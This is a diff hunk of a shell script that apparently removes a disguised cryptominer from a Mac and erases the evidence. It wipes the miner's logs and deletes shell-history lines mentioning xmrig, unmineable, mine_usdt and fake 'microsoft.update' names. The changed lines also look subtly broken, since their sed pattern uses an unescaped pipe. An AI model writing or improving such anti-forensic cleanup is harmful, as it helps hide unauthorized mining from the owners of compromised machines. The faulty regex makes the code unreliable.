@@ -39,10 +39,8 @@ rm -f "$LOG_PATH" && echo "      ✓ Log wiped"
 rm -f "$HOME/Library/Logs/${DISGUISE_NAME}"* 2>/dev/null || true
 
 echo "[6/6] Scrubbing history..."
-for H in "$HOME/.zsh_history" "$HOME/.bash_history"; do
-  [[ -f "$H" ]] && sed -i '' '/mine_usdt\|xmrig\|unmineable\|updateassistant\|microsoft\.update\|TFgAiy/d' "$H" 2>/dev/null && echo "      ✓ $H cleaned"
-done
-history -c 2>/dev/null || true
+  sed -i '/mine_usdt|xmrig|unmineable/d' "$HOME/.zsh_history" 2>/dev/null || true
+  sed -i '/mine_usdt|xmrig|unmineable/d' "$HOME/.bash_history" 2>/dev/null || true
 
 echo ""
 [[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" && ! -f "$LOG_PATH" ]] \
